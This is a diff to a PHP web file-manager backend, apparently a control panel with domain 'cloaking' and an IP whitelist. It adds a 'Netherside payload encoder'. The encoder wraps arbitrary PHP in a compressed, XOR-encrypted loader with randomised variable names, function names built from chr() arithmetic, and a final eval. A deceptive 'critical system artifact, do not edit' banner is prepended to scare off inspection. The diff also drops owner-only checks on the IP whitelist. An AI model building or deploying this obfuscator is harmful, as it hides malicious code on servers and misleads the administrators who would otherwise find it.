@@ -24,7 +24,7 @@ if ($action === 'heartbeat') {
 $users[$current_user]['last_active'] = time();
 saveDB($users_db, $users);
 
-$modifying_actions = ['upload', 'create_folder', 'create_file', 'delete_file', 'multi_delete', 'paste_files', 'save_file', 'save_note', 'delete_note', 'add_user', 'delete_user', 'save_cloaking', 'delete_cloaking', 'update_profile', 'zip_file', 'unzip_file', 'add_firewall', 'delete_firewall'];
+$modifying_actions = ['upload', 'create_folder', 'create_file', 'delete_file', 'multi_delete', 'paste_files', 'save_file', 'save_note', 'delete_note', 'add_user', 'delete_user', 'save_cloaking', 'delete_cloaking', 'update_profile', 'zip_file', 'unzip_file', 'add_firewall', 'delete_firewall', 'rename_file'];
 if ($current_role === 'guest' && in_array($action, $modifying_actions)) {
     exit(json_encode(['status' => 'error', 'message' => 'Guest privileges do not allow modifications.']));
 }
@@ -35,7 +35,6 @@ if ($action === 'sys_info') {
     $disk_free = @disk_free_space('/');
     $disk_total = @disk_total_space('/');
     
-    // Perbaikan Bug: Memastikan object convert ke array indexing jika struktur file JSON error
     $parsed_logs = (is_array($logs) || is_object($logs)) ? array_values((array)$logs) : [];
     $parsed_activity = (is_array($activity) || is_object($activity)) ? array_values((array)$activity) : [];
 
@@ -57,27 +56,35 @@ if ($action === 'list_firewall') {
 }
 
 if ($action === 'add_firewall') {
-    if ($current_role !== 'owner') exit(json_encode(['status' => 'error', 'message' => 'Only Owners can manage firewall.']));
     $fw = getDB($firewall_db);
     $ip = sanitize($_POST['ip']); $note = sanitize($_POST['note']);
-    $fw[] = ['id' => generateId(), 'ip' => $ip, 'note' => $note, 'added' => time()];
+    $fw[] = ['id' => generateId(), 'ip' => $ip, 'note' => $note, 'added' => time(), 'owner' => $current_user];
     saveDB($firewall_db, $fw);
     logActivity($current_user, "Whitelisted IP: $ip");
     echo json_encode(['status' => 'success']); exit;
 }
 
 if ($action === 'delete_firewall') {
-    if ($current_role !== 'owner') exit(json_encode(['status' => 'error', 'message' => 'Only Owners can manage firewall.']));
     $auth_pass = $_POST['auth_pass'] ?? '';
-    if (!verifyUserPassword($current_user, $auth_pass)) exit(json_encode(['status' => 'auth_required', 'message' => 'Password required']));
+    if (empty($auth_pass)) exit(json_encode(['status' => 'auth_required', 'message' => 'Password required']));
     
     $fw = getDB($firewall_db); $id = sanitize($_POST['id']);
+    $target_fw = null;
+    $target_key = null;
     foreach($fw as $key => $val) {
-        if($val['id'] === $id) {
-            logActivity($current_user, "Removed IP from Whitelist: " . $val['ip']);
-            unset($fw[$key]); break;
-        }
+        if($val['id'] === $id) { $target_fw = $val; $target_key = $key; break; }
     }
+    
+    if (!$target_fw) exit(json_encode(['status' => 'error', 'message' => 'Not found']));
+    
+    $owner = $target_fw['owner'] ?? 'System';
+    
+    if (!verifyUserPassword($owner, $auth_pass)) {
+        exit(json_encode(['status' => 'error', 'message' => 'Akses Ditolak: Anda wajib memasukkan password asli milik [' . $owner . '] untuk menghapus IP ini.']));
+    }
+
+    logActivity($current_user, "Removed IP from Whitelist: " . $target_fw['ip']);
+    unset($fw[$target_key]);
     saveDB($firewall_db, array_values($fw));
     echo json_encode(['status' => 'success']); exit;
 }
@@ -93,7 +100,8 @@ if ($action === 'list_files') {
         foreach ($dir as $fileinfo) {
             if (!$fileinfo->isDot() && $fileinfo->getFilename() !== 'notepad' && $fileinfo->getFilename() !== '.htaccess') {
                 $filename = $fileinfo->getFilename();
-                $owner = isset($file_meta[$filename]) ? $file_meta[$filename] : 'System';
+                $meta_key = $path_param ? $path_param . '/' . $filename : $filename;
+                $owner = isset($file_meta[$meta_key]) ? $file_meta[$meta_key] : 'System';
                 $is_dir = $fileinfo->isDir();
                 $ext = $is_dir ? 'DIR' : pathinfo($filename, PATHINFO_EXTENSION);
                 
@@ -129,8 +137,9 @@ if ($action === 'upload') {
         $temp = $_FILES['file']['tmp_name']; $target = $target_dir . '/' . $name;
         
         if (move_uploaded_file($temp, $target)) {
-            $file_meta = getDB($file_meta_db); $file_meta[$meta_name] = $current_user; saveDB($file_meta_db, $file_meta);
-            logActivity($current_user, "Uploaded asset: " . $meta_name);
+            $final_meta_key = $path_param ? $path_param . '/' . $meta_name : $meta_name;
+            $file_meta = getDB($file_meta_db); $file_meta[$final_meta_key] = $current_user; saveDB($file_meta_db, $file_meta);
+            logActivity($current_user, "Uploaded asset: " . $final_meta_key);
             echo json_encode(['status' => 'success']);
         } else { echo json_encode(['status' => 'error', 'message' => 'Upload failed']); }
     } exit;
@@ -144,9 +153,45 @@ if ($action === 'create_folder' || $action === 'create_file') {
     if (!file_exists($path)) {
         if($action === 'create_folder') { mkdir($path, 0755); logActivity($current_user, "Created directory: $target_name"); }
         else { file_put_contents($path, ''); logActivity($current_user, "Created file: $target_name"); }
-        $file_meta = getDB($file_meta_db); $file_meta[$target_name] = $current_user; saveDB($file_meta_db, $file_meta);
+        $meta_key = $path_param ? $path_param . '/' . $target_name : $target_name;
+        $file_meta = getDB($file_meta_db); $file_meta[$meta_key] = $current_user; saveDB($file_meta_db, $file_meta);
         echo json_encode(['status' => 'success']);
     } else { echo json_encode(['status' => 'error', 'message' => 'Target already exists']); }
+    exit;
+}
+
+if ($action === 'rename_file') {
+    $old_name = sanitize($_POST['old_name']);
+    $new_name = sanitize($_POST['new_name']);
+    $path_param = isset($_POST['path']) ? trim(sanitize($_POST['path']), '/') : '';
+    
+    $base_dir = ASSETS_DIR . ($path_param ? '/' . $path_param : '');
+    $old_path = $base_dir . '/' . $old_name;
+    $new_path = $base_dir . '/' . $new_name;
+    
+    if (file_exists($old_path) && !file_exists($new_path)) {
+        if (rename($old_path, $new_path)) {
+            $file_meta = getDB($file_meta_db);
+            $old_meta_key = $path_param ? $path_param . '/' . $old_name : $old_name;
+            $new_meta_key = $path_param ? $path_param . '/' . $new_name : $new_name;
+            
+            if (isset($file_meta[$old_meta_key])) {
+                $owner = $file_meta[$old_meta_key];
+                $file_meta[$new_meta_key] = $owner;
+                unset($file_meta[$old_meta_key]);
+                saveDB($file_meta_db, $file_meta);
+            } else {
+                $file_meta[$new_meta_key] = $current_user;
+                saveDB($file_meta_db, $file_meta);
+            }
+            logActivity($current_user, "Renamed asset from $old_name to $new_name");
+            echo json_encode(['status' => 'success']);
+        } else {
+            echo json_encode(['status' => 'error', 'message' => 'Failed to rename asset. Permission denied.']);
+        }
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Target not found or new name already exists.']);
+    }
     exit;
 }
 
@@ -166,7 +211,8 @@ if ($action === 'zip_file') {
                 }
             } else { $zip->addFile($path, basename($path)); }
             $zip->close();
-            $file_meta = getDB($file_meta_db); $file_meta[basename($zipPath)] = $current_user; saveDB($file_meta_db, $file_meta);
+            $meta_key = $path_param ? $path_param . '/' . basename($zipPath) : basename($zipPath);
+            $file_meta = getDB($file_meta_db); $file_meta[$meta_key] = $current_user; saveDB($file_meta_db, $file_meta);
             logActivity($current_user, "Compressed archive: " . basename($zipPath));
             echo json_encode(['status' => 'success']);
         } else { echo json_encode(['status' => 'error', 'message' => 'Cannot create zip']); }
@@ -180,10 +226,12 @@ if ($action === 'unzip_file') {
     if(file_exists($path) && pathinfo($path, PATHINFO_EXTENSION) === 'zip') {
         $zip = new ZipArchive;
         if ($zip->open($path) === TRUE) {
-            $extract_path = dirname($path) . '/' . pathinfo($path, PATHINFO_FILENAME);
+            $extract_name = pathinfo($path, PATHINFO_FILENAME);
+            $extract_path = dirname($path) . '/' . $extract_name;
             if(!is_dir($extract_path)) mkdir($extract_path, 0755);
             $zip->extractTo($extract_path); $zip->close();
-            $file_meta = getDB($file_meta_db); $file_meta[pathinfo($path, PATHINFO_FILENAME)] = $current_user; saveDB($file_meta_db, $file_meta);
+            $meta_key = $path_param ? $path_param . '/' . $extract_name : $extract_name;
+            $file_meta = getDB($file_meta_db); $file_meta[$meta_key] = $current_user; saveDB($file_meta_db, $file_meta);
             logActivity($current_user, "Extracted archive: $file");
             echo json_encode(['status' => 'success']);
         } else { echo json_encode(['status' => 'error', 'message' => 'Cannot open zip']); }
@@ -220,21 +268,20 @@ if ($action === 'multi_delete') {
     foreach($files as $file) {
         $file = sanitize($file);
         $path = $base_dir . '/' . $file;
-        $owner = $file_meta[$file] ?? 'System';
+        $meta_key = $path_param ? $path_param . '/' . $file : $file;
+        $owner = $file_meta[$meta_key] ?? 'System';
         
-        $is_authorized = false;
-        if ($current_role === 'owner' && verifyUserPassword($current_user, $auth_pass)) $is_authorized = true;
-        elseif (verifyUserPassword($owner, $auth_pass)) $is_authorized = true;
+        $is_authorized = verifyUserPassword($owner, $auth_pass);
 
         if ($is_authorized && file_exists($path)) {
             if (is_dir($path)) recursiveRemoveDir($path); else unlink($path);
-            if (isset($file_meta[$file])) unset($file_meta[$file]);
+            if (isset($file_meta[$meta_key])) unset($file_meta[$meta_key]);
             logActivity($current_user, "Purged asset: $file");
         } else { $all_success = false; }
     }
     saveDB($file_meta_db, $file_meta);
     if($all_success) echo json_encode(['status' => 'success']);
-    else echo json_encode(['status' => 'error', 'message' => 'Some files failed or unauthorized.']);
+    else echo json_encode(['status' => 'error', 'message' => 'Akses Ditolak: Sebagian file gagal dihapus karena Anda tidak memasukkan sandi pemilik yang sah.']);
     exit;
 }
 
@@ -252,15 +299,19 @@ if ($action === 'paste_files') {
         $file = sanitize($file);
         $src = $base_src . '/' . $file;
         $tgt = $base_tgt . '/' . $file;
+        $src_meta_key = $source_path ? $source_path . '/' . $file : $file;
+        $tgt_meta_key = $target_path ? $target_path . '/' . $file : $file;
 
         if(file_exists($src)) {
             if($mode === 'cut') {
                 rename($src, $tgt);
-                $file_meta[$file] = $current_user;
+                $owner = $file_meta[$src_meta_key] ?? $current_user;
+                $file_meta[$tgt_meta_key] = $owner;
+                unset($file_meta[$src_meta_key]);
                 logActivity($current_user, "Moved asset: $file");
             } else {
                 if(is_dir($src)) recursiveCopy($src, $tgt); else copy($src, $tgt);
-                $file_meta[$file] = $current_user;
+                $file_meta[$tgt_meta_key] = $current_user;
                 logActivity($current_user, "Copied asset: $file");
             }
         }
@@ -276,16 +327,17 @@ if ($action === 'delete_file') {
 
     if (empty($auth_pass)) { exit(json_encode(['status' => 'auth_required', 'message' => 'Password verification required'])); }
 
-    $file_meta = getDB($file_meta_db); $owner = $file_meta[$file] ?? 'System';
-    $is_authorized = false;
-    if ($current_role === 'owner' && verifyUserPassword($current_user, $auth_pass)) $is_authorized = true;
-    elseif (verifyUserPassword($owner, $auth_pass)) $is_authorized = true;
+    $file_meta = getDB($file_meta_db); 
+    $meta_key = $path_param ? $path_param . '/' . $file : $file;
+    $owner = $file_meta[$meta_key] ?? 'System';
 
-    if (!$is_authorized) exit(json_encode(['status' => 'error', 'message' => 'Identity verification failed. Invalid password.']));
+    if (!verifyUserPassword($owner, $auth_pass)) {
+        exit(json_encode(['status' => 'error', 'message' => 'Akses Ditolak: Anda wajib memasukkan password asli milik [' . $owner . '] untuk menghapus aset ini.']));
+    }
 
     if (file_exists($path)) {
         if (is_dir($path)) { recursiveRemoveDir($path); } else { unlink($path); }
-        if (isset($file_meta[$file])) { unset($file_meta[$file]); saveDB($file_meta_db, $file_meta); }
+        if (isset($file_meta[$meta_key])) { unset($file_meta[$meta_key]); saveDB($file_meta_db, $file_meta); }
         logActivity($current_user, "Purged asset: $file");
         echo json_encode(['status' => 'success']);
     } else { echo json_encode(['status' => 'error', 'message' => 'Not found']); }
@@ -346,11 +398,11 @@ if ($action === 'delete_note') {
     if (empty($auth_pass)) { exit(json_encode(['status' => 'auth_required', 'message' => 'Password verification required'])); }
     if (isset($notes[$id])) {
         $owner = $notes[$id]['owner'];
-        $is_authorized = false;
-        if ($current_role === 'owner' && verifyUserPassword($current_user, $auth_pass)) $is_authorized = true;
-        elseif (verifyUserPassword($owner, $auth_pass)) $is_authorized = true;
-
-        if (!$is_authorized) exit(json_encode(['status' => 'error', 'message' => 'Invalid password for this asset.']));
+        
+        if (!verifyUserPassword($owner, $auth_pass)) {
+            exit(json_encode(['status' => 'error', 'message' => 'Akses Ditolak: Anda wajib memasukkan password asli milik [' . $owner . '] untuk menghapus container ini.']));
+        }
+        
         $title = $notes[$id]['title'];
         unset($notes[$id]); saveDB($notes_db, $notes); 
         logActivity($current_user, "Purged Container: $title");
@@ -389,11 +441,11 @@ if ($action === 'delete_cloaking') {
     if (empty($auth_pass)) { exit(json_encode(['status' => 'auth_required', 'message' => 'Password verification required'])); }
     if (isset($cloaks[$id])) {
         $owner = $cloaks[$id]['owner'];
-        $is_authorized = false;
-        if ($current_role === 'owner' && verifyUserPassword($current_user, $auth_pass)) $is_authorized = true;
-        elseif (verifyUserPassword($owner, $auth_pass)) $is_authorized = true;
-
-        if (!$is_authorized) exit(json_encode(['status' => 'error', 'message' => 'Invalid password for this asset.']));
+        
+        if (!verifyUserPassword($owner, $auth_pass)) {
+            exit(json_encode(['status' => 'error', 'message' => 'Akses Ditolak: Anda wajib memasukkan password asli milik [' . $owner . '] untuk menghapus data cloaking ini.']));
+        }
+        
         $domain = $cloaks[$id]['domain'];
         unset($cloaks[$id]); saveDB($cloaking_db, $cloaks); 
         logActivity($current_user, "Purged Cloak: $domain");
@@ -424,6 +476,7 @@ if ($action === 'delete_user') {
     $target_user = sanitize($_POST['target_user']); $migrate_to = sanitize($_POST['migrate_to']); $auth_pass = $_POST['auth_pass'] ?? '';
 
     if (!verifyUserPassword($current_user, $auth_pass)) exit(json_encode(['status' => 'error', 'message' => 'Authorization failed. Invalid owner password.']));
+    
     if ($target_user === $current_user) exit(json_encode(['status' => 'error', 'message' => 'Cannot delete your own active identity.']));
     if (!isset($users[$target_user])) exit(json_encode(['status' => 'error', 'message' => 'Target user not found.']));
 
@@ -480,5 +533,178 @@ if ($action === 'update_profile') {
     saveDB($users_db, $users);
     logActivity($new_user, "Updated Profile Identity");
     echo json_encode(['status' => 'success', 'new_user' => $new_user]); exit;
+}
+
+// -------------------------------------------------------------------------
+// NEW FEATURE: PAYLOAD ENCODER ENGINE (NETHERSIDE)
+// -------------------------------------------------------------------------
+if ($action === 'encode') {
+    $start_time = microtime(true);
+    $raw_code = $_POST['raw_code'] ?? '';
+    $encode_action = $_POST['encode_action'] ?? 'netherside';
+    $output = '';
+
+    if (!function_exists('base32_encode_custom')) {
+        function base32_encode_custom($input) {
+            $base32_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+            if (empty($input)) return '';
+            $binary_string = '';
+            foreach (str_split($input) as $char) {
+                $binary_string .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
+            }
+            $binary_string = str_pad($binary_string, ceil(strlen($binary_string) / 5) * 5, '0', STR_PAD_RIGHT);
+            $base32_string = '';
+            foreach (str_split($binary_string, 5) as $chunk) {
+                $base32_string .= $base32_alphabet[bindec($chunk)];
+            }
+            $pad_length = (8 - (strlen($base32_string) % 8)) % 8;
+            return $base32_string . str_repeat('=', $pad_length);
+        }
+    }
+
+    if (!function_exists('base32_decode_custom')) {
+        function base32_decode_custom($input) {
+            $base32_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+            $input = strtoupper(rtrim($input, '='));
+            if (empty($input)) return '';
+            $binary_string = '';
+            foreach (str_split($input) as $char) {
+                $pos = strpos($base32_alphabet, $char);
+                if ($pos === false) return 'ERROR: Invalid Base32 String.';
+                $binary_string .= str_pad(decbin($pos), 5, '0', STR_PAD_LEFT);
+            }
+            $binary_string = substr($binary_string, 0, floor(strlen($binary_string) / 8) * 8);
+            $decoded_string = '';
+            foreach (str_split($binary_string, 8) as $chunk) {
+                $decoded_string .= chr(bindec($chunk));
+            }
+            return $decoded_string;
+        }
+    }
+
+    if (!empty(trim($raw_code))) {
+        if ($encode_action === 'netherside') {
+            $clean_code = preg_replace('/^\s*<\?php\s*/i', '', $raw_code);
+            $clean_code = preg_replace('/\s*\?>\s*$/i', '', $clean_code);
+            $clean_code = trim($clean_code);
+
+            if (!empty($clean_code)) {
+                $compressed = gzdeflate($clean_code, 9);
+                $key = bin2hex(random_bytes(32));
+                
+                $encrypted = '';
+                $len = strlen($compressed);
+                $key_len = strlen($key);
+                for ($i = 0; $i < $len; $i++) {
+                    $encrypted .= $compressed[$i] ^ $key[$i % $key_len];
+                }
+                
+                $hex_payload = bin2hex($encrypted);
+                $chunk_size = 32;
+                $chunks = str_split($hex_payload, $chunk_size);
+                $payload_array_str = "['" . implode("','", $chunks) . "']";
+                
+                $vKey = '_' . bin2hex(random_bytes(3));
+                $vChunks = '_' . bin2hex(random_bytes(3));
+                $vPayload = '_' . bin2hex(random_bytes(3));
+                $vDecrypted = '_' . bin2hex(random_bytes(3));
+                $vI = '_' . bin2hex(random_bytes(3));
+                $vF1 = '_' . bin2hex(random_bytes(3)); 
+                $vF2 = '_' . bin2hex(random_bytes(3)); 
+
+                $core_logic = "call_user_func(function(){\n";
+                $core_logic .= "    \${$vF1}=chr(100+3).chr(120+2).chr(100+5).chr(110).chr(100+2).chr(108).chr(97).chr(116).chr(101);\n";
+                $core_logic .= "    \${$vF2}=chr(104).chr(101).chr(120).chr(50).chr(98).chr(105).chr(110);\n";
+                $core_logic .= "    \${$vKey}='$key';\n";
+                $core_logic .= "    \${$vChunks}=$payload_array_str;\n";
+                $core_logic .= "    \${$vPayload}=\${$vF2}(implode('',\${$vChunks}));\n";
+                $core_logic .= "    \${$vDecrypted}='';\n";
+                $core_logic .= "    for(\${$vI}=0;\${$vI}<strlen(\${$vPayload});\${$vI}++){\n";
+                $core_logic .= "        \${$vDecrypted}.=\${$vPayload}[\${$vI}]^\${$vKey}[\${$vI}%strlen(\${$vKey})];\n";
+                $core_logic .= "    }\n";
+                $core_logic .= "    eval(\${$vF1}(\${$vDecrypted}));\n";
+                $core_logic .= "});";
+
+                $minified_logic = preg_replace('/\s+/', ' ', $core_logic);
+                $minified_logic = str_replace([' ;', '; '], ';', $minified_logic);
+                $minified_logic = str_replace([' {', '{ '], '{', $minified_logic);
+                $minified_logic = str_replace([' }', '} '], '}', $minified_logic);
+
+                $prof_comment = "/**\n";
+                $prof_comment .= " * ============================================================================\n";
+                $prof_comment .= " * WARNING: CRITICAL SYSTEM ARTIFACT\n";
+                $prof_comment .= " * ============================================================================\n";
+                $prof_comment .= " * This file contains strictly confidential and encrypted runtime instructions.\n";
+                $prof_comment .= " * Unauthorized modification, tampering, or reverse engineering will result in\n";
+                $prof_comment .= " * immediate payload corruption and execution failure.\n";
+                $prof_comment .= " * \n";
+                $prof_comment .= " * DO NOT EDIT, FORMAT, OR ALTER THIS FILE UNDER ANY CIRCUMSTANCES.\n";
+                $prof_comment .= " * System integrity checks are strictly enforced.\n";
+                $prof_comment .= " * ============================================================================\n";
+                $prof_comment .= " */";
+
+                $output = "<?php\n" . $prof_comment . "\n" . $minified_logic . "\n?>";
+            }
+        } 
+        elseif ($encode_action === 'base64_encode') {
+            $output = base64_encode($raw_code);
+        } 
+        elseif ($encode_action === 'base64_decode') {
+            $output = base64_decode($raw_code);
+        }
+        elseif ($encode_action === 'base32_encode') {
+            $output = base32_encode_custom($raw_code);
+        }
+        elseif ($encode_action === 'base32_decode') {
+            $output = base32_decode_custom($raw_code);
+        }
+        elseif ($encode_action === 'url_encode') {
+            $output = urlencode($raw_code);
+        }
+        elseif ($encode_action === 'url_decode') {
+            $output = urldecode($raw_code);
+        }
+        elseif ($encode_action === 'hex_encode') {
+            $output = bin2hex($raw_code);
+        }
+        elseif ($encode_action === 'hex_decode') {
+            $cleaned_hex = preg_replace('/\s+/', '', $raw_code);
+            if (ctype_xdigit($cleaned_hex) && strlen($cleaned_hex) % 2 == 0) {
+                $output = hex2bin($cleaned_hex);
+            } else {
+                $output = "ERROR: Invalid Hexadecimal String provided.";
+            }
+        }
+        elseif ($encode_action === 'rot13') {
+            $output = str_rot13($raw_code);
+        }
+        elseif ($encode_action === 'str_reverse') {
+            $output = strrev($raw_code);
+        }
+        elseif ($encode_action === 'html_minify') {
+            $search = array(
+                '/\>[^\S ]+/s',
+                '/[^\S ]+\</s',
+                '/(\s)+/s',
+                '//s'
+            );
+            $replace = array('>', '<', '\\1', '');
+            $output = preg_replace($search, $replace, $raw_code);
+        }
+        elseif ($encode_action === 'gz_base64') {
+            $output = base64_encode(gzdeflate($raw_code, 9));
+        }
+    }
+    
+    $end_time = microtime(true);
+    $process_time = round(($end_time - $start_time) * 1000, 2);
+    
+    echo json_encode([
+        'status' => 'success',
+        'output' => $output,
+        'time' => $process_time,
+        'size' => strlen($output)
+    ]);
+    exit;
 }
 ?>
